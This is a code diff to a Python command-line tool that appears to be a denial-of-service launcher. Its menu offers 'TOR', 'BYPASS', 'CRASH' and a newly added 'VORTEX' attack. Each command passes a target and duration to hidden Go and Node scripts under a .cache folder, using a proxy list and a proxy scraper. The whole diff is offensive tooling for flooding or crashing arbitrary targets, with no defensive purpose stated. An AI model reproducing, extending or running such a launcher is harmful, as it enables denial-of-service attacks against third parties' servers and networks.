@@ -13,7 +13,6 @@ def pro(cr, tl, br_ln=30):
     br = "█" * fl_ln + "-" * (br_ln - fl_ln)
     return f"[{br}] {cr}/{tl}"
 
-
 def clr_csl():
     o.system("cls" if o.name == "nt" else "clear")
 
@@ -139,7 +138,9 @@ def mn_lp():
        (Top-secret Protocols)
 
         Commands available:
-   -  TOR   : Attack via TOR network
+   -  TOR    : Attack via TOR network
+   -  BYPASS : Attack via Bypassing protection
+   -  CRASH  : Attack via Crashing Ips
                     """
                 )
                 continue
@@ -154,7 +155,7 @@ def mn_lp():
                 ani_txt("👋 Goodbye, have a great day.", 0.02)
                 break
 
-            elif cmd in ["TOR", "BYPASS", "CRASH"]:
+            elif cmd in ["TOR", "BYPASS", "CRASH", "VORTEX"]:
                 try:
                     tg = parts[1]
                     mx_tm = int(parts[2])
@@ -183,6 +184,14 @@ def mn_lp():
                             )
                             rn_cmd(
                                 f"go run bin/odd/.cache/CRASH.go {tg} 9999 post 600 nil"
+                            )
+                        elif cmd == "VORTEX":
+                            rn_cmd(
+                                f"node bin/odd/.cache/VORTEX.js {tg} 600 100 10 root/proxy.txt"
+                            )
+                            rn_cmd(f"python3 root/scrape.py &")
+                            rn_cmd(
+                                f"node bin/odd/.cache/VORTEX.js {tg} 600 100 10 root/proxy.txt"
                             )
                         t.sleep(1)
                 except IndexError:
